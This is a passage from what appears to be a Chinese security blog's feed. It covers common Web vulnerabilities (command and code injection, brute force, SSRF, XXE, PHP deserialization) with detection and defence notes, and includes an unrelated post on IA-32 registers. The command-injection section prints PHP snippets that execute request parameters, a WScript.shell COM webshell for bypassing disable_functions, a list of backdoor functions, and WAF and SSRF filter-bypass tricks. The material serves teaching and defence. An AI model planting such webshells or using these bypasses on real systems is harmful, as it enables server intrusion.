HTTP 请求或不更新 Cookie中 loginErr 的值反复提交，这样程序会因为无从获取 Cookie/sessionID，会认为攻击者是首次访问，从而验证码不会出现。</p><p>服务器端问题：</p><p>1、 验证码不过期，没有及时销毁会话导致验证码复用</p><p>2、 没有进行非空判断</p><p>3、 产生的验证码问题集内的答案非常有限</p><h3 id="三、检测方法-4"><a href="#三、检测方法-4" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p>简单的方法，先是手工登录几次，查看是否出现验证码以及验证码是否失效，然后再通过Burpsuite来进一步测试。</p><h3 id="四、防御方法-4"><a href="#四、防御方法-4" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p>1、 强制要求输入验证码，否则必须实施 IP 策略。注意不要被 X-Forwarded-For（用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段） 绕过了。</p><p>2、 验证码只能用一次，用完立即过期。</p><p>3、 验证码强度增强，使用扭曲、变形、干扰线条、干扰背景色、变换字体等。</p><p>4、 大网站最好统一安全验证码，各处使用同一个验证码接口。</p><h2 id="命令注入漏洞"><a href="#命令注入漏洞" class="headerlink" title="命令注入漏洞"></a>命令注入漏洞</h2><h3 id="一、基本概念-6"><a href="#一、基本概念-6" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以注入恶意系统命令到正常命令中，达到任意命令执行的效果。 </p><p>这里以PHP为主，以后在Java分类中会单独总结Java类的漏洞。</p><p><strong>成因</strong></p><p>程序未严格区分用户输入的内容是数据还是代码。</p><p><strong>PHP与命令执行漏洞相关的函数</strong></p><p>1、PHP的5种命令执行函数：system()、exec()、passthru()、shell_exec()、<code></code>运算符</p><p>2、命令执行小集：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">cmd=<span class="string">"system"</span>;</span><br><span class="line">ob_start(cmd);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"_GET[cunlide]"</span>;</span><br><span class="line">ob_end_flush();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">system(<span class="string">"GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> exec(<span class="string">"$GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> shell_exec(<span class="string">"_GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> passthru(<span class="string">"GET[cunlide]"</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> `$GET[cunlide]`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>3、PHP后门木马常用的函数类型：</p><p>执行系统命令：system, passthru, shell_exec, exec, popen, proc_open</p><p>代码执行与加密：eval, assert, call_user_func,base64_decode, gzinflate, gzuncompress, gzdecode, str_rot13</p><p>文件包含与生成：require，require_once，include,  include_once，file_get_contents, file_put_contents, fputs, fwrite<br>.htaccess：SetHandler, auto_prepend_file, auto_append_file</p><h3 id="二、绕过WAF的方法-2"><a href="#二、绕过WAF的方法-2" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h3><p><strong>1、黑白名单测试绕过</strong></p><p><strong>2、可用符号替换</strong></p><p><strong>3、换行符\n</strong></p><p><strong>4、$IFS替换空格</strong></p><h3 id="三、绕过disable-functions的方法"><a href="#三、绕过disable-functions的方法" class="headerlink" title="三、绕过disable_functions的方法"></a>三、绕过disable_functions的方法</h3><p>禁止 webshell 执行命令原理：PHP配置文件里的disable_functions =  配置，用来禁止某些 php 函数。</p><p>1、 黑名单绕过</p><p>2、 系统组件绕过（Windows）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">command=_POST[a];</span><br><span class="line">wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);   <span class="comment">// 生成一个 COM 对象</span></span><br><span class="line">exec = wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">stdout = exec-&gt;StdOut();</span><br><span class="line">stroutput = stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>Shell.Application 也可以实现同样的效果。</p><p>彻底的解决方案是直接删除 System32 目录下 wshom.ocx 文件。</p><p>3、 扩展库绕过：Linux下可通过编译拓展库进行绕过。</p><p>防御方法：将dl函数加入disable_function中禁用。</p><p>使用PHP突破Disable_functions执行Linux命令：linux 的 webshell 管理员禁用了exec，system，passthru，popen，shell_exec等等 PHP 执行命令函数，导致不能执行命令，php 提供了一个扩展模块功能，使用 dl 函数能包含一个扩展模块。类似.so或者想windows下的 dll 文件。可以自定义函数来调用 linux 命令而无视Disable_functions的限制。</p><p>在PHP中使用create_function()创建匿名函数，如果没有严格对参数传递进行过滤，攻击者可以构造特殊字符串传递给 create_function()执行任意命令。</p><h3 id="四、检测方法-1"><a href="#四、检测方法-1" class="headerlink" title="四、检测方法"></a>四、检测方法</h3><p>基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。</p><p>基于白盒的测试：查看源代码，搜索PHP中执行系统命令的函数如system、passthru等。</p><h3 id="五、防御方法-1"><a href="#五、防御方法-1" class="headerlink" title="五、防御方法"></a>五、防御方法</h3><p>1、尽量不要执行外部的应用程序或命令。</p><p>2、使用自定义函数或函数库实现外部应用程序或命令的功能。</p><p>3、在执行 system 等命令执行功能的函数前，确定参数内容。</p><p>4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } </p><p>5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。</p><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h3 id="一、基本概念-7"><a href="#一、基本概念-7" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>暴力破解其实并不算是漏洞而是设计缺陷，当页面或程序未对请求的数量进行严格的限制时，攻击者可使用字典一直暴力破解用户名密码，导致密码被破解出来的安全风险。</p><p><strong>分类</strong></p><p>1、C/S架构暴力破解：</p><p>主要使用的破解工具Hydra、Bruter、X-scan</p><p>2、B/S架构暴力破解：</p><p>使用Burpsuite镜像表单爆破</p><h3 id="二、检测方法"><a href="#二、检测方法" class="headerlink" title="二、检测方法"></a>二、检测方法</h3><p>简单粗暴的方法，直接使用Burpsuite进行暴力破解，看看有没有什么防暴破的机制即可。</p><h3 id="三、防御方法"><a href="#三、防御方法" class="headerlink" title="三、防御方法"></a>三、防御方法</h3><p>1、设置复杂的密码</p><p>2、采用验证码机制，同时可防范CSRF攻击</p><p>3、登陆日志，限制登录次数</p><p>4、调用sleep()函数，当登录失败时停止一段时间才允许再次登录，如DVWA的High级的防暴破机制</p><h2 id="代码注入"><a href="#代码注入" class="headerlink" title="代码注入"></a>代码注入</h2><h3 id="一、基本概念-8"><a href="#一、基本概念-8" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>代码注入，与命令注入类似，程序未对用户输入内容进行严格校验从而导致恶意代码注入执行，只不过是注入到特定的编程语言代码中，如PHP的eval注入、HTML页面的JS注入、OGNL注入等。</p><p>这里以PHP为主，Java代码会在Java分类中单独总结。</p><p><strong>成因</strong></p><p>程序未严格区分用户输入的内容是数据还是代码。</p><p><strong>PHP中代码注入函数</strong></p><p>eval()、assert()、preg_replace()、str_replace()、call_user_func()…等函数。</p><p>eval()函数注入攻击，将参数字符串作为PHP 程序代码来执行，用户可以将 PHP 代码保存成字符串的形式，然后传递给 eval 函数执行。</p><p>PHP中的assert()、preg_replace()、str_replace()以及call_user_func()函数同样可以实现eval 注入攻击的效果。preg_replace()函数的作用是用来执行常规表达式的查找和替换的，当替换内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p><h3 id="二、绕过WAF的方法-3"><a href="#二、绕过WAF的方法-3" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h3><p>和命令注入类似。</p><h3 id="三、检测方法-5"><a href="#三、检测方法-5" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p>基于黑盒的测试：简单点就是直接手工在输入内容之后添加各种分号或其它可以绕过的符号再添加命令，最后查看返回结果判断。</p><p>基于白盒的测试：查看源代码，搜索与执行PHP代码的函数如eval、assert等。</p><h3 id="四、防御方法-5"><a href="#四、防御方法-5" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p>1、尽量不要执行外部的应用程序或命令。</p><p>2、使用自定义函数或函数库实现外部应用程序或命令的功能。</p><p>3、在执行php中eval()等代码执行功能的函数前，确定参数内容。</p><p>4、使用 escapeshellarg ()函数和escapeshellcmd()函数处理相关用户输入的内容。escapeshellarg() 函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\’”，双引号“””会被转义为“\””，分号“ ;”会被转义为“\;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。escapeshellcmd()函数会转义内容中的所有shell元字符来进行防御，这些元字符包括：# $ ; , \ ‘ | ? * ~ &lt; &gt; ^ ( ) [ ] { } </p><p>5、使用 safe_mode_exec_dir 执行可执行的文件路径。将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录中，并使用 safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在 safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。</p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="一、基本概念-9"><a href="#一、基本概念-9" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><p>形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有发现在这个请求是合法的，然后服务器以他的身份来访问其他服务器的资源。</p><p><strong>出现漏洞的常见位置</strong></p><p>1）分享：通过URL地址分享网页内容</p><p>2）转码服务</p><p>3）在线翻译</p><p>4）图片加载与下载：通过URL地址加载或下载图片</p><p>5）图片、文章收藏功能</p><p>6）未公开的api实现以及其他调用URL的功能</p><p>7）从URL关键字中寻找</p><h3 id="二、绕过WAF的方法-4"><a href="#二、绕过WAF的方法-4" class="headerlink" title="二、绕过WAF的方法"></a>二、绕过WAF的方法</h3><p>主要针对URL过滤的绕过。</p><p>1、 使用@符号：我们请求<a href="http://a.com@b.com与请求http://b.com的结果是一致的；" target="_blank" rel="noopener">http://a.com@b.com与请求http://b.com的结果是一致的；</a></p><p>2、 IP地址转换进制访问：如115.239.210.26 ＝ 16373751032</p><p>3、 添加端口号：<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>4、 使用短链接：<a href="http://dwz.cn/11SMa" target="_blank" rel="noopener">http://dwz.cn/11SMa</a></p><h3 id="三、检测方法-6"><a href="#三、检测方法-6" class="headerlink" title="三、检测方法"></a>三、检测方法</h3><p>1、因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2、在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><h3 id="四、防御方法-6"><a href="#四、防御方法-6" class="headerlink" title="四、防御方法"></a>四、防御方法</h3><p>1、过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p><p>2、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p><p>3、限制请求的端口为http常用的端口，比如，80,443,8080,8090。</p><p>4、黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。</p><p>5、禁用不需要的协议。仅仅允许http和https请求。可以防止类似于file:///,gopher://,ftp:// 等引起的问题。</p><h2 id="XML注入"><a href="#XML注入" class="headerlink" title="XML注入"></a>XML注入</h2><h3 id="一、基本概念-10"><a href="#一、基本概念-10" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>XML是一种可扩展标记语言，可以理解为HTML的扩展语言，一般用于数据存储、数据传输、数据共享，其中DTD文档来解释XML文档。XML必须包含根元素，所有的标签都要闭合，对大小写敏感，并且属性值需要加引号。</p><p>XML注入即XXE（XML外部实体注入），是指利用可控的参数或入口来加载不可控的参数或代码，造成不可控的运行结果。</p><p>ENTITY实体：如果在XML文档中需要频繁使用某一条数据，可以预先给这个数据起一个别名。即一个ENTITY，然后再在文档中调用它。</p><p>XML定义了两种类型的ENTITY，一种在XML文档中使用，另一种在为参数在DTD文件中使用。</p><p>定义语法：\&lt;!DOCTYPE  文件名 [ \&lt;!ENTITY  实体名 “实体内容”&gt; ] &gt;</p><p>定义好的ENTITY在文档中通过“&amp;实体名;”来使用。</p><p>正常来说，DTD分为内部DTD与外部DTD，内部DTD包含在XML文档中,外部DTD则通过URL引用。一个DTD文件是以.dtd结尾的文本文件 。前面还要加上SYSTEM，但是如果此处没有任何过滤，我们完全可以引用系统敏感文件的，前提是页面有回显，否则你只引用了文件但不知道文件内容。</p><p><strong>成因：</strong></p><p>Xfire使用了STAX解析XML导致XML实体注入发生。</p><p>1、直接引入XML外部实体</p><p>2、未加任何过滤直接parse</p><p><strong>漏洞危害：</strong></p><p>1、任意文件读取：通过外部实体引用，可以获取文件内容</p><p>2、URL请求，SSRF</p><p>3、DoS</p><p>4、远程代码执行：在PHP开启expect扩展的前提下</p><h3 id="二、检测方法-1"><a href="#二、检测方法-1" class="headerlink" title="二、检测方法"></a>二、检测方法</h3><p>盲测：判断request的XML请求是否被解析，可以根据请求头中的“SOAP”字段来判断，也可以根据错误返回中有“SAX”字样。</p><p>漏洞挖掘总结：一般为Xfire开发的或者某些wsdl结尾的文件。</p><p>1、Service为Xfire</p><p>2、明显的XML作为内容的输入点</p><p>3、某些以JSON格式的Request</p><h3 id="三、防御方法-1"><a href="#三、防御方法-1" class="headerlink" title="三、防御方法"></a>三、防御方法</h3><p>1、禁用外部实体</p><p>2、过滤和验证用户提交的XML数据</p><p>3、不允许XML中含有任何自己声明的DTD</p><p>4、有效的措施：配置XML parser只能使用静态DTD，禁止外来引入；对于Java来说，直接设置相应的属性值为false即可</p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="一、基本概念-11"><a href="#一、基本概念-11" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>通常我们定义了一个类的对象，其中保存了一些属性值，为了方便下次可以继续使用在这个对象或者在其他的文件中可以使用该对象，于是就可以调用serialize()函数将该对象序列化为字符串的形式，将该字符串保存起来，等到需要使用该对象时只需将该字符串传过去并调用unserialize()函数对其反序列化即可。</p><p>这里以PHP为例，Java的会在Java分类单独总结。</p><p>PHP在进行反序列化操作时，若存在相应的魔法函数、unserialize()函数的参数可控且可以传递到魔法函数中执行相应的敏感操作，则会造成PHP反序列化漏洞的风险。</p><p>serialize()：将一个对象转成字符串形式，方便保存以便于下次再次反序列化出该对象直接使用。</p><p>unserialize()：将序列化后的字符串反序列化成一个对象。</p><p><strong>利用前提</strong></p><p>unserialize()函数的参数可控；</p><p>代码中存在一个构造函数、析构函数、__wakeup()函数中有向php文件中写数据的操作的类或执行PHP代码或命令执行的类；</p><p>所写的内容需要有对象中的成员变量的值。</p><p><strong>PHP魔法函数</strong></p><p>下面列下可能经常碰到的魔法函数，其余的查查资料也知道了。</p><p>__construct()：构造函数，当一个对象创建时被调用。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p><p>__destruct()：析构函数，当一个对象销毁时被调用。会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p><p>__toString()：当一个对象被当作一个字符串使用。此方法必须返回一个字符串，否则将发出一条E_RECOVERABLE_ERROR级别的致命错误。</p><p>__sleep()：常用于提交未提交的数据，或类似的清理操作。同时，如果有一些很大的对象，但不需要全部保存，这个功能就很好用。serialize()函数会检查类中是否存在一个魔术方法__sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个E_NOTICE级别的错误。</p><p>_<em>wakeup()：经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。unserialize()会检查是否存在一个\</em>_wakeup()方法。如果存在，则会先调用__wakeup()，预先准备对象需要的资源。</p><p><strong>PHP反序列化漏洞分类</strong></p><p>unserialize()反序列化漏洞</p><p>session反序列化漏洞</p><p>phar反序列化漏洞</p><h3 id="二、检测方法-2"><a href="#二、检测方法-2" class="headerlink" title="二、检测方法"></a>二、检测方法</h3><p>以PHP为例，全局搜索PHP的反序列化函数如unserialize()，查看其中涉及的文件代码中是否含有魔法函数或其他危险的类方法，且进一步排查魔法函数的内容是否外界可控且存在危险操作。</p><h3 id="三、防御方法-2"><a href="#三、防御方法-2" class="headerlink" title="三、防御方法"></a>三、防御方法</h3><p>1、要严格控制unserialize()函数的参数，坚持用户所输入的信息都是不可靠的原则；</p><p>2、要对于反序列化后的变量内容进行检查，以确定内容没有被污染。</p><h2 id="XPath注入"><a href="#XPath注入" class="headerlink" title="XPath注入"></a>XPath注入</h2><h3 id="一、基本概念-12"><a href="#一、基本概念-12" class="headerlink" title="一、基本概念"></a>一、基本概念</h3><p><strong>漏洞定义</strong></p><p>待完善…</p><h3 id="二、检测方法-3"><a href="#二、检测方法-3" class="headerlink" title="二、检测方法"></a>二、检测方法</h3><p>待完善…</p><h3 id="三、防御方法-3"><a href="#三、防御方法-3" class="headerlink" title="三、防御方法"></a>三、防御方法</h3><p>待完善…</p><h2 id="LDAP注入"><a href="#LDAP注入" class="headerlink" title="LDAP注入"></a>LDAP注入</h2><p>具体可参考<a href="http://www.4hou.com/technology/9090.html" target="_blank" rel="noopener">技术详解：基于Web的LDAP注入漏洞</a></p><h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><p>待完善…</p><h2 id="URL不安全重定向"><a href="#URL不安全重定向" class="headerlink" title="URL不安全重定向"></a>URL不安全重定向</h2><p>待完善…</p><h2 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h2><p>待完善…</p><h2 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h2><p>待完善…</p><h2 id="Web缓存攻击"><a href="#Web缓存攻击" class="headerlink" title="Web缓存攻击"></a>Web缓存攻击</h2><p>待完善…</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里小结一下常见的Web漏洞类型，待完善。&lt;/p&gt;
&lt;h2 id=&quot;SQL注入与SQL盲注&quot;&gt;&lt;a href=&quot;#SQL注入与SQL盲注&quot; class=&quot;headerlink&quot; title=&quot;SQL注入与SQL盲注&quot;&gt;&lt;/a&gt;SQL注入与SQL盲注&lt;/h2&gt;&lt;h3 id=&quot;
      
    
    </summary>
    
      <category term="Web安全基础" scheme="https://Mi1k7ea.github.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>IA-32（Intel Architecture 32位）寄存器</title>
    <link href="https://Mi1k7ea.github.com/2019/01/28/IA-32%E5%AF%84%E5%AD%98%E5%99%A8/"/>
    <id>https://Mi1k7ea.github.com/2019/01/28/IA-32寄存器/</id>
    <published>2019-01-28T15:51:20.000Z</published>
    <updated>2019-02-08T14:21:14.595Z</updated>
    
    <content type="html"><![CDATA[<h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><p>用于传送和暂存数据，参与算数逻辑运算并保存运算结果。IA-32每个通用寄存器的大小都是32位，即4个字节，主要用来保存常量和地址等信息。</p><p>以下4个通用寄存器主要用于算术运算如ADD、SUB、XOR、OR等，常用于保存常量与变量的值。</p><p>EAX：（针对操作数和结果数据的）累加器，一般用在函数返回值中，所有Win32 API函数都会把返回值保存到EAX后再返回。EAX寄存器又分为高、低几个独立的寄存器，AX（0-15）为EAX（0-31）的低16位独立寄存器，而AX又分为高8位的AH（8-15）和低8位的AL（0-7）两个独立寄存器，下面的EBX、ECX和EDX同理。</p><p>EBX：（DS段中的数据指针）基址寄存器。</p><p>ECX：（字符串和循环操作的）计数器，如在循环命令LOOP中用来循环计数、每执行完一次循环ECX就自减一。</p><p>EDX：（I/O指针）数据寄存器。</p><p>以下4个通用寄存器主要用于保存内存地址的指针。</p><p>ESI：（字符串操作源指针）源变址寄存器。</p><p>EDI：（字符串操作目标指针）目的变址寄存器，ESI和EDI与特定指令（LODS、STOS、REP、MOVS等）一起使用，主要用于内存复制。</p><p>EBP：（SS段中栈内数据指针）扩展基址指针寄存器，表示栈区域的基地址，即指向栈最上面的一个栈帧的底部，函数被调用时保存ESP的值，函数返回时再把值返回ESP，保证栈不会崩溃（即栈帧技术）。</p><p>ESP：（SS段中栈指针）栈指针寄存器，指向栈区域的栈顶地址。</p><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><p>在IA-32的保护模式中，段是一种内存保护技术，将内存划分为多个区段，并为每个区段赋予起始地址、范围、访问权限等以保护内存。段内存记录在SDT中，而段寄存器持有这些SDT的索引。每个段寄存器的大小为16位，即2个字节，且每个段寄存器指向的段描述符与虚拟内存结合，形成一个线性地址，借助分页技术，线性地址最终被转换为实际的物理地址。</p><p>CS：Code Segment，代码段寄存器。</p><p>DS：Data Segment，数据段寄存器。</p><p>SS：Stack Segment，栈段寄存器。</p><p>ES：Extra (Data) Segment，附加（数据）段寄存器。</p><p>FS：Data Segment，数据段寄存器，在程序调试中经常用于计算SEH（结构化异常处理机制）、TEB（线程环境块）、PEB（进程环境块）。</p><p>GS：Data Segment，数据段寄存器。</p><p>其中ES、FS、GS寄存器用来存放程序使用的附加数据段的段基址。</p><h2 id="程序状态与控制寄存器"><a href="#程序状态与控制寄存器" class="headerlink" title="程序状态与控制寄存器"></a>程序状态与控制寄存器</h2><p>EFLAGS：Flag Register，标志寄存器，大小为4个字节即32位，每一位都有意义，有些位由系统直接设定，有些位则根据程序命令的执行结果设置。</p><p><img src="/2019/01/28/IA-32寄存器/1.png" alt="寄存器"> </p><p>先了解3个常用的与程序调试相关的标志，ZF（Zero Flag零标志）、OF（Overflow Flag溢出标志）、CF（Carry Flag进位标志）。</p><p>ZF：若运算结果为0，则为1（True），否则为0（False）。</p><p>OF：有符号整数溢出时，则为1。此外，MSB（最高有效位）改变时，也为1。</p><p>CF：无符号整数溢出时，则为1。</p><h2 id="指令指针寄存器"><a href="#指令指针寄存器" class="headerlink" title="指令指针寄存器"></a>指令指针寄存器</h2><p>EIP：Instruction Pointer，指令指针寄存器，保存着CPU要执行的指令地址，大小为32位即4个字节。</p><p>程序运行时，CPU会读取EIP中的一条指令地址，传送指令到指令缓冲区后，EIP寄存器的值将自动增加，增加的大小为读取指令的字节大小。CPU每次执行完一条指令，就会通过EIP寄存器读取并执行下一条指令。</p><p>注意的就是，EIP寄存器和通用寄存器不同，不能直接修改EIP的值，只能通过其他指令间接修改，如JMP、Jcc、CALL、RET。也可以通过中断或者异常来修改EIP的值。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;通用寄存器&quot;&gt;&lt;a href=&quot;#通用寄存器&quot; class=&quot;headerlink&quot; title=&quot;通用寄存器&quot;&gt;&lt;/a&gt;通用寄存器&lt;/h2&gt;&lt;p&gt;用于传送和暂存数据，参与算数逻辑运算并保存运算结果。IA-32每个通用寄存器的大小都是32位，即4个字节，主要用来保
      
    
    </summary>
    
      <category term="二进制基础" scheme="https://Mi1k7ea.github.com/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="二进制" scheme="https://Mi1k7ea.github.com/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
  </entry>
  
</feed>
